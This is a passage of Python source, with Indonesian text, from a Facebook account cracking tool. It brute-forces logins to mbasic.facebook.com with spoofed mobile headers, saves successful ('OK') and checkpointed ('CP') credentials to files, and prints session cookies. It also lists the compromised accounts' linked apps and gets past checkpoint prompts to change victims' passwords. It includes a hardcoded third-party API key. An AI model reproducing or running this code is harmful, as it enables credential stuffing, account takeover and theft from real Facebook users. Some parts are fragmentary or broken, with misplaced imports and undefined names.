            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in ses.cookies.get_dict().keys():
                print(f' {P}[{K}CP{P}] {K}{idf}|{pw}')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f' {P}[{H}OK{P}] {H}{idf}|{pw}\n{kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                break
            else:continue
        except requests.exceptions.ConnectionError:time.sleep(31)
    loop+=1
 

#--------------------[ METODE reguler ]-----------------#
def reguler(idf,pwv):
    global loop,ok,cp
    rr = random.randint
    prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    ua=random.choice(prem)
    ses = requests.Session()
    for pw in pwv:
        pw = pw.lower()
        try:
            if 'ya' in ualuh: ua = ualu[0]
            link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
            data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
            headers = {'Host': 'mbasic.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
            po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp+=1
                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
                prints(tree)
                os.popen('play-audio c.mp3')
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                ceker(idf,pw)
                akun.append(idf+'|'+pw)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
                prints(tree)
                os.popen('play-audio o.mp3')
                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                cek_apk(kuki)
                break
            else:continue
        except requests.exceptions.ConnectionError:time.sleep(31)
    loop+=1
    
#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    except AttributeError:
        print ("\r    %s\033[0m cookie invalid"%(M))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
    except AttributeError:
        print ("\r    %s \033[0mcookie invalid"%(M))

ops=[]
def ceker(idf,pw):
    sess=requests.Session()
    data={}
    uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
    sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
    soup=parser(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):data.update({x.get("name"):x.get("value")})
    data.update({"email":idf,"pass":pw})
    response=parser(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
    try:
        link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
        responses=parser(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
        cek=[cek.text for cek in responses.find_all("option")]
        if len(cek)==0:pass
        else:
            for opsi in range(len(cek)):
                ops.append(print('\r  \033[0m              ➛'+cek[opsi]))
    except:pass
    if len(ops)==0:pass
    console().print(f'{H2}• {P2}Columns(ops)')
                          
def ceker1(idf,pw):
    global cp
    ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
    head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
    ses = requests.Session()
    try:
        hi = ses.get('https://mbasic.facebook.com')
        ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
        jo = ho.find('form')
        data = {}
        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
        for anj in jo('input'):
            if anj.get('name') in lion:
                data.update({anj.get('name'):anj.get('value')})
        kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
        cp+=1
        opsi = kent.find_all('option')
        if len(opsi)==0:
            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
        else:
            for opsii in opsi:
                print('\r%s---> %s%s'%(kk,opsii.text,x))
    except Exception as c:
        print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
        cp+=1

# OPSI CEKER
def cek_opsi():
    c = len(akun)
    hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    cetak(nel(hu, title='CEK OPSI'))
    input(x+'['+h+'•'+x+'] Mulai')
    cek = '# PROSES CEK OPSI DIMULAI'
    sol().print(mark(cek, style='green'))
    love = 0
    for kes in akun:
        try:
            try:
                idf,pw = kes.split('|')[0],kes.split('|')[1]
            except IndexError:
                time.sleep(2)
                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
                continue
            bi = random.choice([u,k,kk,b,h,hh])
            print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),idf,x), end=' ');sys.stdout.flush()
            ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
            ses = requests.Session()
            header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            hi = ses.get('https://mbasic.facebook.com')
            ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
            if "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jo = ho.find('form')
                    data = {}
                    lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({anj.get('name'):anj.get('value')})
                    kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                    print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                    opsi = kent.find_all('option')
                    if len(opsi)==0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                    else:
                        for opsii in opsi:
                            print('\r%s---> %s%s'%(kk,opsii.text,x))
                except:
                    print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
            elif "c_user" in ses.cookies.get_dict().keys():
                print('\r%s++++ %s|%s ----> OK       %s'%(h,idf,pw,x))
            else:
                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,idf,pw,x))
            love+=1
        except requests.exceptions.ConnectionError:
            print('')
            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
            sol().print(mark(li, style='red'))
            exit()
    dah = '# DONE'
    sol().print(mark(dah, style='green'))
    exit()


def ceker2(idf,pw):
    sess=requests.Session()
    data={}
    uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
    sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
    soup=parser(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):data.update({x.get("name"):x.get("value")})
    data.update({"email":idf,"pass":pw})
    response=parser(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
    try:
        link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
        responses=parser(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
        cek=[cek.text for cek in responses.find_all("option")]
        if len(cek)==0:pass
        else:
            for opsi in range(len(cek)):opsi.append(print("[bold white]"+cek[opsi]))
    except:pass
    if len(opsi)==0:pass
    print (' [+] Columns(opsi)')
                              
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
day = datetime.now().strftime("%d-%b-%Y")

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
    for mau in keliling + '\n':
        sys.stdout.write(mau)
        sys.stdout.flush();jeda(0.03)
        
        
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
    dirs = os.listdir('CP')
    for file in dirs:
        prints(Panel(f"{M2}{(file)}",width=80, style=f"{color_panel}"))
    try:
        prints(Panel(f"{P2}Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt",width=80, style=f"{color_panel}"))
        opsi()
    except IOError:
        prints(Panel(f"Tidak Ada File Untuk Di Cek Silahkan Crack Dulu",width=80, style=f"{color_panel}"))
        exit()

def opsi():
    CP = ("CP/")
    romi = console.input(f" {H2}• {P2}Tempelkan Sini : ")
    if romi == "":
        Console().print(f"[bold cyan]   ╰─>[bold red] Isi Yang Benar""",width=80, style=f"{color_panel}")
        opsi()
    try:
        file_cp = open(CP+romi, "r").readlines()
    except IOError:
        exit(Console().print(Panel(f"[bold cyan]   ╰─>[bold red] Nama File {(romi)} Tidak Di Temukan",width=80, style=f"{color_panel}")))
    prints(Panel(f"[bold white]Sebelum Melanjutkan Hidupkan/Matikan Mode Pesawat",width=80, style=f"{color_panel}"))
    pw= console.input(f" {H2}• {P2}Ubah Password Y/T: ")
    if pw in['y','Y']:
        ubah_pass.append("ubah_sandi")
        Console().print(panel("[bold white] Masukan Password Baru", width=80, style=f"{color_panel}"))
        pw2=console.input(f" {H2}• {P2}PW Baru : ")
        if len(pw2) <= 5:
            Console().print(Panel(f"[bold white]Sandi Minimal 6 Karakter",width=80, style=f"{color_panel}"))
        else:
            pwbaru.append(pw2)
    prints(Panel(f"[bold white]Total akun : [bold green]{str(len(file_cp))}",width=80, style=f"{color_panel}"))
    nomor = 0
    for fb in file_cp:
        akun = fb.replace("\n","")
        ngecek  = akun.split("|")
        nomor+=1
        Console().print(Panel(f"[bold white][{(str(nomor))}] Cek Sesi Akun = {akun}",width=80,style=f"{color_panel}"));jeda(0.10)
        try:
            mengecek(ngecek[0].replace("",""), ngecek[1])
        except requests.exceptions.ConnectionError:
            continue

data = {}
data2 = {}
def mengecek(user,pw):
    global loop,ubah_pass,pwbaru
    session=requests.Session()
    ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
    url = "https://mbasic.facebook.com"
    session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pw})
    urlPost=session.post(url+link.get("action"),data=data)
    response=bs4.BeautifulSoup(urlPost.text, "html.parser")
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
        else:
            print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
            open('OK/OK-%s.txt'%(day), 'a').write(" %s|%s\n" % (user,pw))
    elif "checkpoint" in session.cookies.get_dict():
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url+link2.get("action"),data=data2)
        response2=bs4.BeautifulSoup(an.text,"html.parser")
        cek=[cek.text for cek in response2.find_all("option")]
        number=0
        print("\r%s%s \033[0m [+] Terdapat %s%s%s \033[0mOpsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "ubah_sandi" in ubah_pass:
                    dat,dat2={},{}
                    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
                    for x in response("input"):
                        if x.get("name") in but:
                            dat.update({x.get("name"):x.get("value")})
                    ubahPw=session.post(url+link2.get("action"),data=dat).text
                    resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
                    link3=resUbah.find("form",{"method":"post"})
                    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
                    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
                        for b in resUbah("input"):
                            dat2.update({b.get("name"):b.get("value")})
                        dat2.update({"password_new":"".join(pwbaru)})
                        an=session.post(url+link3.get("action"),data=dat2)
                        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                        print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
                        open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
                else:
                    print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
                    tree = Tree(" ",guide_style=f"{color_ok}")
                    tree.add(Panel(f"{ua}",width=83,padding=(0,2),style=f"{color_ok}"))
                    prints(tree)
                    open('OK/OK-%s.txt' %(day), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(Panel("\r%s \033[0m akun terpasang autentikasi dua faktor			"%(M)))
            else:
                print("%s%s\033[0mterjadi kesalahan"%(M,til))
        else:
            if "c_user" in session.cookies.get_dict():
                print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
                open('OK/OK-%s.txt' %(day), 'a').write("%s%s|%s\n" % (H,user,pw))
        for opsi in range(len(cek)):
            number +=1
            jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
    elif "login_error" in str(response):
        oh = response.find("div",{"id":"login_error"}).find("div").text
        print("%s %s"%(M,oh))
    else:
        tree = Tree(" ",guide_style=f"bold white")
        tree.add(Panel(f"{P2}login gagal, silahkan cek kembali id dan kata sandi",width=83,padding=(0,2),style=f"{color_panel}"))
        prints(tree)
          
def scarpping_ua():
    uascrap = []
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")

#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
def back():
  login()
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')


class Lain:
        
    ###----------[ FUNCTION INIT ]---------- ###
    def __init__(self,cookie):
        self.cookie = cookie
        self.file = []
        self.listfile = []
        
    ###----------[ MENU ]---------- ###
    def menu(self):
        prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
        menu = console.input(f" {H2}• {P2}pilih menu : ")
        if menu in["01","1"]:
            self.cek_hasil()
        elif menu in["04","4"]:
            self.ganti_tema()
        elif menu in["05","5"]:
            self.tampil_cookie()
        elif menu in["06","6"]:
            os.system("rm .cok.txt")
            os.system("rm .token.txt")
            exit(prints(Panel(f"""{H2}berhasil menghapus cookie dan token, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
        else:
            exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
    ###----------[ CEK HASIL CRACK ]---------- ###
    def cek_hasil(self):
        prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
        ask = console.input(f" {H2}• {P2}masukan pilihan : ")
        if ask in["1","01"]:folder = "OK"
        else:folder = "CP"
        
        ###----------[ PILIH FILE ]---------- ###
        dirs = os.listdir(folder)
        prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
        num = 0
        for fil in dirs:
            num += 1
            self.file.append(fil)
            totalakun = open(f"{folder}/{fil}","r").read().splitlines()
            self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
            self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
            self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
        console.print(Columns(self.listfile))
        prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
        result = console.input(f" {H2}• {P2}masukan angka : ")
        
        ###----------[ MULAI CEK ]---------- ###
        try:
            files = self.file[int(result)-1]
            totalhasil = open(f"{folder}/{files}","r").read().splitlines()
        except:
            prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
            exit()
        nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
        prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
        for akun in totalhasil:
            user = akun.split("|")[0]
            pw = akun.split("|")[1]
